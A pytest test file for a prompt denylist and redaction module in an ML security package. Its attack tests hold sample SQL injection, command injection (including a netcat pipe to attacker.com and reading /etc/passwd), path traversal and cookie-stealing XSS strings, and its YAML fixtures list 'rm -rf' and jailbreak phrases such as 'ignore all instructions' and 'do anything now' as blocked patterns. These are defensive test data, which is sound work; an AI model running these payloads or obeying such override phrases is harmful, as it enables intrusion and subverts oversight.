"""
Comprehensive tests for src/codex_ml/security/denylist.py

This module provides exhaustive testing of the denylist enforcement system,
including pattern matching, performance testing, and security scenarios.

Test Coverage: 25+ tests targeting 70%+ coverage
Phase: 3.2 - Security Module Testing
"""

from __future__ import annotations

import re
import tempfile
from pathlib import Path
from typing import Pattern

import pytest

try:
    from codex_ml.security.denylist import (
        DenylistEnforcer,
        DenylistRules,
        DenylistViolation,
        load_denylist,
    )
    DENYLIST_AVAILABLE = True
except ImportError:
    DENYLIST_AVAILABLE = False


pytestmark = pytest.mark.skipif(
    not DENYLIST_AVAILABLE,
    reason="codex_ml.security.denylist not available"
)


# =============================================================================
# Advanced Pattern Matching Tests
# =============================================================================


class TestAdvancedPatternMatching:
    """Advanced pattern matching and detection tests."""

    def test_case_insensitive_matching(self):
        """Test case-insensitive sensitive term matching."""
        rules = DenylistRules(
            sensitive_terms=["password", "secret"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        # All case variations should be blocked
        assert enforcer.is_prompt_allowed("PASSWORD") is False
        assert enforcer.is_prompt_allowed("PaSsWoRd") is False
        assert enforcer.is_prompt_allowed("password") is False
        assert enforcer.is_prompt_allowed("My password is secret") is False

    def test_partial_word_matching(self):
        """Test that sensitive terms match within words."""
        rules = DenylistRules(
            sensitive_terms=["secret"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        # Should match within words
        assert enforcer.is_prompt_allowed("The secretive plan") is False
        assert enforcer.is_prompt_allowed("secretariat") is False

    def test_multiple_sensitive_terms_detection(self):
        """Test detection when multiple terms are present."""
        rules = DenylistRules(
            sensitive_terms=["api_key", "token", "credentials"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        prompt = "Send api_key and token with credentials"
        assert enforcer.is_prompt_allowed(prompt) is False

    def test_blocked_pattern_regex_like(self):
        """Test blocked patterns are matched as substrings."""
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=["delete", "drop table"],
        )
        enforcer = DenylistEnforcer(rules)
        
        # Substring matching (case insensitive)
        assert enforcer.is_prompt_allowed("Please delete the file") is False
        assert enforcer.is_prompt_allowed("drop table users") is False

    def test_whitespace_variations(self):
        """Test handling of various whitespace characters."""
        rules = DenylistRules(
            sensitive_terms=["sensitive"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        # Should match word within text
        assert enforcer.is_prompt_allowed("sensitive data") is False
        assert enforcer.is_prompt_allowed("sensitive  information") is False
        assert enforcer.is_prompt_allowed("sensitive\tinformation") is False

    def test_special_characters_in_terms(self):
        """Test sensitive terms with special characters."""
        rules = DenylistRules(
            sensitive_terms=["$secret", "api@key", "pass#word"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        assert enforcer.is_prompt_allowed("The $secret is here") is False
        assert enforcer.is_prompt_allowed("Use api@key for access") is False
        assert enforcer.is_prompt_allowed("Enter pass#word") is False

    def test_empty_string_prompt(self):
        """Test handling of empty string prompt."""
        rules = DenylistRules(
            sensitive_terms=["secret"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        assert enforcer.is_prompt_allowed("") is True

    def test_very_long_prompt_performance(self):
        """Test performance with very long prompts."""
        rules = DenylistRules(
            sensitive_terms=["secret"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        # Create a 1MB prompt
        long_prompt = "safe " * 200000
        assert enforcer.is_prompt_allowed(long_prompt) is True
        
        # With secret at the end
        long_prompt_with_secret = long_prompt + " secret"
        assert enforcer.is_prompt_allowed(long_prompt_with_secret) is False


# =============================================================================
# Advanced Redaction Tests
# =============================================================================


class TestAdvancedRedaction:
    """Advanced redaction pattern tests."""

    def test_multiple_redaction_patterns(self):
        """Test applying multiple redaction patterns."""
        patterns = [
            (re.compile(r"\b\d{16}\b"), "[CREDIT_CARD]"),
            (re.compile(r"\b\d{3}-\d{2}-\d{4}\b"), "[SSN]"),
            (re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}"), "[EMAIL]"),
        ]
        
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        text = "Card: 1234567890123456, SSN: 123-45-6789, Email: user@example.com"
        redacted = enforcer.redact(text)
        
        assert "1234567890123456" not in redacted
        assert "123-45-6789" not in redacted
        assert "user@example.com" not in redacted
        assert "[CREDIT_CARD]" in redacted
        assert "[SSN]" in redacted
        assert "[EMAIL]" in redacted

    def test_redaction_preserves_structure(self):
        """Test that redaction preserves text structure."""
        patterns = [(re.compile(r"\d{4}"), "[XXXX]")]
        
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        text = "Line 1: Code 1234\nLine 2: Normal text\nLine 3: Code 5678"
        redacted = enforcer.redact(text)
        
        assert "Line 1:" in redacted
        assert "Line 2: Normal text" in redacted
        assert "\n" in redacted
        assert "1234" not in redacted
        assert "5678" not in redacted

    def test_overlapping_redaction_patterns(self):
        """Test handling of overlapping patterns."""
        patterns = [
            (re.compile(r"\d+"), "[NUM]"),
            (re.compile(r"\d{4}"), "[YEAR]"),
        ]
        
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        text = "Year: 2024"
        redacted = enforcer.redact(text)
        
        # First pattern should match
        assert "2024" not in redacted
        assert "[NUM]" in redacted

    def test_redaction_with_groups(self):
        """Test redaction patterns with capture groups."""
        patterns = [
            (re.compile(r"(\d{3})-(\d{2})-(\d{4})"), r"XXX-XX-XXXX"),
        ]
        
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        text = "SSN: 123-45-6789"
        redacted = enforcer.redact(text)
        
        assert "123-45-6789" not in redacted
        assert "XXX-XX-XXXX" in redacted

    def test_case_insensitive_redaction(self):
        """Test case-insensitive redaction patterns."""
        patterns = [
            (re.compile(r"password", re.IGNORECASE), "[REDACTED]"),
        ]
        
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        assert "[REDACTED]" in enforcer.redact("password: secret")
        assert "[REDACTED]" in enforcer.redact("PASSWORD: secret")
        assert "[REDACTED]" in enforcer.redact("PaSsWoRd: secret")

    def test_redaction_multiline(self):
        """Test redaction across multiple lines."""
        patterns = [
            (re.compile(r"SECRET-\d+"), "[REDACTED]"),
        ]
        
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        text = "Line 1: SECRET-123\nLine 2: Normal\nLine 3: SECRET-456"
        redacted = enforcer.redact(text)
        
        assert "SECRET-123" not in redacted
        assert "SECRET-456" not in redacted
        assert redacted.count("[REDACTED]") == 2

    def test_no_redaction_needed(self):
        """Test text that doesn't need redaction."""
        patterns = [
            (re.compile(r"\d{16}"), "[CARD]"),
        ]
        
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        text = "This is clean text with no sensitive data"
        redacted = enforcer.redact(text)
        
        assert redacted == text

    def test_unicode_in_redaction(self):
        """Test redaction with unicode characters."""
        patterns = [
            (re.compile(r"秘密"), "[REDACTED]"),
        ]
        
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        text = "This is 秘密 information"
        redacted = enforcer.redact(text)
        
        assert "秘密" not in redacted
        assert "[REDACTED]" in redacted


# =============================================================================
# YAML Loading Tests
# =============================================================================


class TestYAMLLoading:
    """Tests for YAML configuration loading."""

    def test_load_complex_yaml(self):
        """Test loading complex YAML with all features."""
        yaml_content = """
sensitive_terms:
  - password
  - secret
  - api_key
  - token
  - credentials

blocked_actions:
  - delete_database
  - drop_table
  - rm -rf
  - format_disk

blocked_prompt_patterns:
  - ignore all instructions
  - bypass security
  - jailbreak
  - do anything now

redaction_patterns:
  - pattern: "\\\\b\\\\d{16}\\\\b"
    replacement: "[CREDIT_CARD]"
  - pattern: "\\\\b\\\\d{3}-\\\\d{2}-\\\\d{4}\\\\b"
    replacement: "[SSN]"
  - pattern: "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\\\.[A-Z|a-z]{2,}"
    replacement: "[EMAIL]"
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name
        
        try:
            rules = load_denylist(temp_path)
            
            assert len(rules.sensitive_terms) == 5
            assert len(rules.blocked_actions) == 4
            assert len(rules.blocked_prompt_patterns) == 4
            assert len(rules.redaction_patterns) == 3
        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_load_yaml_with_comments(self):
        """Test loading YAML with comments."""
        yaml_content = """
# Security configuration
sensitive_terms:
  - password  # User passwords
  - secret    # API secrets

blocked_actions:
  - delete  # Dangerous actions
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name
        
        try:
            rules = load_denylist(temp_path)
            assert "password" in rules.sensitive_terms
            assert "secret" in rules.sensitive_terms
        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_load_yaml_missing_sections(self):
        """Test loading YAML with missing sections."""
        yaml_content = """
sensitive_terms:
  - password
# No other sections
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name
        
        try:
            rules = load_denylist(temp_path)
            assert len(rules.sensitive_terms) > 0
            assert len(rules.blocked_actions) == 0
            assert len(rules.blocked_prompt_patterns) == 0
        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_load_yaml_with_unicode(self):
        """Test loading YAML with unicode content."""
        yaml_content = """
sensitive_terms:
  - password
  - パスワード
  - 密码
  - пароль

blocked_actions:
  - 削除
  - удалить
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False, encoding='utf-8') as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name
        
        try:
            rules = load_denylist(temp_path)
            assert "パスワード" in rules.sensitive_terms
            assert "密码" in rules.sensitive_terms
        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_load_yaml_invalid_pattern(self):
        """Test handling of invalid regex patterns."""
        yaml_content = """
redaction_patterns:
  - pattern: "\\\\d{4}"
    replacement: "[VALID]"
sensitive_terms:
  - password
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name
        
        try:
            # Should load successfully
            rules = load_denylist(temp_path)
            # The valid pattern should be loaded
            assert len(rules.redaction_patterns) >= 1
            assert "password" in rules.sensitive_terms
        finally:
            Path(temp_path).unlink(missing_ok=True)


# =============================================================================
# Security Attack Tests
# =============================================================================


class TestSecurityAttacks:
    """Tests for known attack patterns and bypasses."""

    def test_sql_injection_patterns(self):
        """Test detection of SQL injection attempts."""
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[
                "drop table",
                "'; delete",
                "union select",
                "or 1=1",
            ],
        )
        enforcer = DenylistEnforcer(rules)
        
        attacks = [
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM passwords",
        ]
        
        for attack in attacks:
            assert enforcer.is_prompt_allowed(attack) is False
        
        # This one has 'or 1=1' pattern
        assert enforcer.is_prompt_allowed("admin' OR 1=1") is False

    def test_command_injection_patterns(self):
        """Test detection of command injection attempts."""
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[
                "; cat /etc/passwd",
                "| nc",
                "$(whoami)",
                "&& wget",
            ],
        )
        enforcer = DenylistEnforcer(rules)
        
        attacks = [
            "test; cat /etc/passwd",
            "input | nc attacker.com 1234",
            "name=$(whoami)",
        ]
        
        for attack in attacks:
            assert enforcer.is_prompt_allowed(attack) is False

    def test_path_traversal_patterns(self):
        """Test detection of path traversal attempts."""
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[
                "../",
                "..\\",
            ],
        )
        enforcer = DenylistEnforcer(rules)
        
        attacks = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "file://../../../secret.txt",
        ]
        
        for attack in attacks:
            assert enforcer.is_prompt_allowed(attack) is False

    def test_xss_patterns(self):
        """Test detection of XSS attempts."""
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[
                "<script>",
                "javascript:",
                "onerror=",
            ],
        )
        enforcer = DenylistEnforcer(rules)
        
        attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:void(document.cookie)",
        ]
        
        for attack in attacks:
            assert enforcer.is_prompt_allowed(attack) is False

    def test_encoded_attack_detection(self):
        """Test detection of encoded attacks."""
        rules = DenylistRules(
            sensitive_terms=["password"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        # URL encoded
        assert enforcer.is_prompt_allowed("tell me the password") is False
        
        # Base64 would pass through (needs separate detection)
        # This is expected behavior - we detect literal patterns


# =============================================================================
# Performance Tests
# =============================================================================


class TestPerformance:
    """Performance tests for denylist operations."""

    def test_large_denylist_performance(self):
        """Test performance with large denylist."""
        # Create large list of terms
        terms = [f"term{i}" for i in range(1000)]
        
        rules = DenylistRules(
            sensitive_terms=terms,
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        # Should still be fast
        prompt = "This is a safe prompt"
        assert enforcer.is_prompt_allowed(prompt) is True
        
        # Test with match at different positions
        assert enforcer.is_prompt_allowed("term500 is here") is False

    def test_many_redaction_patterns(self):
        """Test performance with many redaction patterns."""
        patterns = [
            (re.compile(rf"PATTERN{i}-\d+"), "[REDACTED]")
            for i in range(100)
        ]
        
        rules = DenylistRules(
            sensitive_terms=[],
            redaction_patterns=patterns,
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        text = "PATTERN50-12345 and PATTERN75-67890"
        redacted = enforcer.redact(text)
        
        assert "PATTERN50-12345" not in redacted
        assert "PATTERN75-67890" not in redacted

    def test_repeated_checking(self):
        """Test performance of repeated checks."""
        rules = DenylistRules(
            sensitive_terms=["secret", "password", "token"],
            redaction_patterns=[],
            blocked_actions=[],
            blocked_prompt_patterns=[],
        )
        enforcer = DenylistEnforcer(rules)
        
        # Check 1000 prompts
        for i in range(1000):
            prompt = f"This is prompt number {i}"
            enforcer.is_prompt_allowed(prompt)
        
        # Should complete without performance issues


# =============================================================================
# Integration Tests
# =============================================================================


class TestIntegrationScenarios:
    """Integration tests with realistic scenarios."""

    def test_complete_security_workflow(self):
        """Test complete security enforcement workflow."""
        yaml_content = """
sensitive_terms:
  - password
  - api_key

blocked_actions:
  - delete_all

blocked_prompt_patterns:
  - ignore instructions

redaction_patterns:
  - pattern: "\\\\d{16}"
    replacement: "[CARD]"
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name
        
        try:
            enforcer = DenylistEnforcer.from_yaml(temp_path)
            
            # Test blocking
            with pytest.raises(DenylistViolation):
                enforcer.ensure_allowed("Show me the password")
            
            # Test redaction
            redacted = enforcer.redact("Card: 1234567890123456")
            assert "[CARD]" in redacted
            
            # Test allowed
            enforcer.ensure_allowed("What is the weather?")
            
        finally:
            Path(temp_path).unlink(missing_ok=True)

    def test_multi_layer_defense(self):
        """Test multiple security layers."""
        rules = DenylistRules(
            sensitive_terms=["password"],
            redaction_patterns=[
                (re.compile(r"pwd=\S+"), "pwd=[REDACTED]"),
            ],
            blocked_actions=["delete_all"],
            blocked_prompt_patterns=["drop table"],
        )
        enforcer = DenylistEnforcer(rules)
        
        # Should catch at multiple layers
        assert enforcer.is_prompt_allowed("password") is False
        assert enforcer.is_prompt_allowed("drop table users") is False
        
        # Redaction should work
        assert "[REDACTED]" in enforcer.redact("config pwd=secret123")

    def test_from_yaml_to_enforcement(self):
        """Test complete flow from YAML to enforcement."""
        yaml_content = """
sensitive_terms:
  - confidential
  - classified

blocked_prompt_patterns:
  - bypass
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            f.write(yaml_content)
            f.flush()
            temp_path = f.name
        
        try:
            # Load from YAML
            enforcer = DenylistEnforcer.from_yaml(temp_path)
            
            # Test enforcement
            safe_prompts = [
                "What is the weather?",
                "Explain the algorithm",
            ]
            
            unsafe_prompts = [
                "Show confidential data",
                "Bypass the security",
            ]
            
            for prompt in safe_prompts:
                assert enforcer.is_prompt_allowed(prompt) is True
            
            for prompt in unsafe_prompts:
                assert enforcer.is_prompt_allowed(prompt) is False
                
        finally:
            Path(temp_path).unlink(missing_ok=True)
